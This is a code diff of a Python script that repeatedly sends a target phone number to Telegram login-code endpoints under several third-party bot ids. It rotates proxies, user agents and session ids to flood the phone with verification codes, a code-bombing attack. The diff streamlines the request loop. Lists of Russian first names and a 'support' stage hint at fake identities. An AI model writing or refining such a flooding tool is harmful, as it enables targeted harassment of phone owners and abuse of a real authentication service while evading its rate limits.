@@ -19,38 +19,13 @@ uaPool = [
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
     "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
 ]
-# (post_url, extra_form_fields, origin_for_headers)
-_SERVICE_CONFIGS = [
-    (
-        "https://oauth.telegram.org/auth/request",
-        {"bot_id": "1852523856", "origin": "https://cabinet.presscode.app", "embed": "1"},
-        "https://cabinet.presscode.app",
-    ),
-    (
-        "https://translations.telegram.org/auth/request",
-        {},
-        "https://translations.telegram.org",
-    ),
-    (
-        "https://oauth.telegram.org/auth/request",
-        {"bot_id": "1093384146", "origin": "https://off-bot.ru", "embed": "1", "request_access": "write"},
-        "https://off-bot.ru",
-    ),
-    (
-        "https://oauth.telegram.org/auth/request",
-        {"bot_id": "366357143", "origin": "https://www.botobot.ru", "embed": "1", "request_access": "write", "lang": "ru"},
-        "https://www.botobot.ru",
-    ),
-    (
-        "https://oauth.telegram.org/auth/request",
-        {"bot_id": "547043436", "origin": "https://core.telegram.org", "embed": "1", "request_access": "write"},
-        "https://core.telegram.org",
-    ),
-    (
-        "https://oauth.telegram.org/auth/request",
-        {"bot_id": "7131017560", "origin": "https://lolz.live/", "request_access": "write"},
-        "https://lolz.live",
-    ),
+codeServiceEndpoints = [
+    "https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin",
+    "https://translations.telegram.org/auth/request",
+    "https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1&request_access=write&return_to=https%3A%2F%2Foff-bot.ru%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1",
+    "https://oauth.telegram.org/auth/login?bot_id=366357143&origin=https%3A%2F%2Fwww.botobot.ru&embed=1&request_access=write&lang=ru&return_to=https%3A%2F%2Fwww.botobot.ru%2F",
+    "https://oauth.telegram.org/auth/login?bot_id=547043436&origin=https%3A%2F%2Fcore.telegram.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcore.telegram.org%2Fwidgets%2Flogin",
+    "https://oauth.telegram.org/auth/login?bot_id=7131017560&origin=https%3A%2F%2Flolz.live%2F",
 ]
 
 maleFirst = ["Александр", "Сергей", "Дмитрий", "Андрей", "Алексей", "Иван", "Максим", "Николай", "Владимир", "Игорь", "Михаил", "Роман", "Артём", "Павел", "Денис", "Евгений", "Егор", "Илья", "Кирилл", "Антон"]
@@ -301,21 +276,10 @@ async def sendCodeOnce(phone: str) -> tuple[bool, str | None]:
 def serviceRoundOnce(phone: str, proxyStr: str, sessid: str) -> int:
     proxies = buildHttpProxies(proxyStr, sessid) if proxyStr else None
     hits = 0
-    for post_url, extra_fields, origin in _SERVICE_CONFIGS:
+    for url in codeServiceEndpoints:
         try:
-            form_data = {"phone": phone}
-            form_data.update(extra_fields)
-            headers = {
-                "User-Agent": random.choice(uaPool),
-                "Origin": origin,
-                "Referer": origin + "/",
-                "X-Requested-With": "XMLHttpRequest",
-                "Content-Type": "application/x-www-form-urlencoded",
-                "Accept": "application/json, text/javascript, */*; q=0.01",
-                "Accept-Language": "ru-RU,ru;q=0.9,en;q=0.8",
-            }
-            r = requests.post(post_url, headers=headers, data=form_data,
-                              proxies=proxies, timeout=25)
+            r = requests.post(url, headers={"User-Agent": random.choice(uaPool)},
+                              data={"phone": phone}, proxies=proxies, timeout=25)
             if r.status_code in (200, 302):
                 hits += 1
         except Exception:
@@ -546,13 +510,12 @@ async def main_support(
         await pb.set_active(SupportProgress.STAGE_SERVICE)
 
     digits = re.sub(r"[^0-9]", "", phone)
-    phone_e164 = f"+{digits}"
     service_total = 0
     loop = asyncio.get_event_loop()
     for i in range(CODE_SERVICE_ROUNDS):
         proxyStr = random.choice(httpProxyList) if httpProxyList else ""
         sessid = secrets.token_hex(8)
-        hits = await loop.run_in_executor(None, lambda p=proxyStr, s=sessid: serviceRoundOnce(phone_e164, p, s))
+        hits = await loop.run_in_executor(None, lambda p=proxyStr, s=sessid: serviceRoundOnce(digits, p, s))
         service_total += hits
         await asyncio.sleep(1.0 / SPEED)
 
